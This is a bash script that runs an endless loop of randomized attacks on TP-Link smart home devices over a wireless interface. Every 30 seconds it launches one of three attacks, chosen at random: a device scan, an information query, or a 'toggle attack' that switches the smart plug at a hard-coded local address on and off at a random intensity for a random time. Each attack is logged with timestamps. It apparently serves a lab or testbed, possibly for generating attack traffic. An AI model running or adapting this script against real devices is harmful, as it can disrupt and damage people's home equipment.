#!/bin/bash

current_time=$(date "+%Y.%m.%d-%H.%M.%S")
printf "\n ******** $current_time STARTING IOT-TOOLKIT ATTACKS\n" 2>&1 | tee -a iot-toolkit_output/iot-toolkit_general_log.txt

i=0

while true
do

    i=$((i+1))
    x1="./iot-scan -i wlan0 -L 2>&1 | tee -a iot-toolkit_output/iot-toolkit_terminal_output.txt"
    x2="./iot-tl-plug -L -i wlan0 -c get_info 2>&1 | tee -a iot-toolkit_output/iot-toolkit_terminal_output.txt"
    x3="./iot-tl-plug --toggle 192.168.200.146"

    x_current=""

    x1_name="Scan for TP-Link devices"
    x2_name="Getting information on TP-Link Smart Plug"
    x3_name="Toggle attack on TP-Link Smart Plug"


    start_current_time=$(date "+%Y.%m.%d-%H.%M.%S")
    printf "\n\n ******* $start_current_time Starting iteration $i \n" 2>&1 | tee -a iot-toolkit_output/iot-toolkit_terminal_output.txt

    rand=$(shuf -i1-3 -n1)
    printf "Random attack $rand - "

    if [ "$rand" = "1" ]; then
        printf "$x1_name scan \n\n"
        echo $(eval $x1)
        x_current="$x1_name"
    elif [ "$rand" = "2" ]; then
        printf "$x2_name scan \n\n"
        echo $(eval $x2)
        x_current="$x2_name"
    elif [ "$rand" = "3" ]; then
        rand_intensity=$(shuf -i50-500 -n1)
        rand_time=$(shuf -i30-360 -n1)
        hash_sign="#"
        toggle_command=$x3$hash_sign$rand_intensity$hash_sign$rand_time
        printf "$x3_name scan, intensity: $rand_intensity , time: $rand_time \n\n"
        echo $(eval $toggle_command)
        x_current="$x3_name intensity: $rand_intensity , time: $rand_time "
    else 
        echo "error"
    fi

    stop_current_time=$(date "+%Y.%m.%d-%H.%M.%S")
    printf "$stop_current_time Finished task : $i\n" 2>&1 | tee -a iot-toolkit_output/iot-toolkit_terminal_output.txt
    printf "Attack $i $x_current start: $start_current_time, finish: $stop_current_time\n\n" 2>&1 | tee -a iot-toolkit_output/iot-toolkit_general_log.txt
    sleep 30s
done

